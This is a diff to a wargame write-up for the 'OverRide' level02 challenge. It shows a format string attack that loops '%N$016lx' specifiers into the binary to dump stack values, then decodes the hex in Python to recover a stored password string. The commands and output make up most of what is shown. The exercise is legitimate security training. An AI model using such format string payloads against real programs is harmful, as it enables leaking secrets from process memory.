@@ -41,9 +41,15 @@ Here `printf()` is ussed is such way that input string is evaluated as a command
 
 As password is stored in the buffer and FSA can be performed, read the stack using long conversion specifier `%lx` (as binary is an 64-bytes).
 
+Let's read first 32 values on the stack, one at time, printing only hexadecimal values
 ```shell
-level02@OverRide:~$ for i in {0..26}; do python -c "print('%$i\$16lx')" | ./level02 | grep -oE '[a-f0-9]{16}' | tr '\n' ' '; done; echo
-2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 
+level02@OverRide:~$ for i in {0..32}; do python -c "print('%$i\$016lx')" | ./level02 | grep -oE '[a-f0-9]{16}' | tr '\n' ' '; done; echo
+00007fffffffe4f0 0000000000000000 0000000000000000 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 00007fffffffe6e8 00000001f7ff9a08 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000100000000 0000000000000000 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0000000000000000 6c36313024383225 0000000000000078 0000000000000000 0000000000000000 0000000000000000
+```
+`filepass` content is lay on stack beetween offset 22 and 26.
+```shell
+level02@OverRide:~$ for i in {22..26}; do python -c "print('%$i\$016lx')" | ./level02 | grep -oE '[a-f0-9]{16}' | tr '\n' ' '; done; echo
+756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
 ```
 Convert hexadecimal value to ASCII within Python
 ```python
@@ -51,8 +57,8 @@ level02@OverRide:~$ python
 Python 2.7.3 (default, Jun 22 2015, 19:33:41)
 [GCC 4.6.3] on linux2
 Type "help", "copyright", "credits" or "license" for more information.
->>> print(bytearray.fromhex("2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d"))
-****************unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
+>>> print(bytearray.fromhex("756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d"))
+unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
 ```
 The password is incorrect.
 ```shell
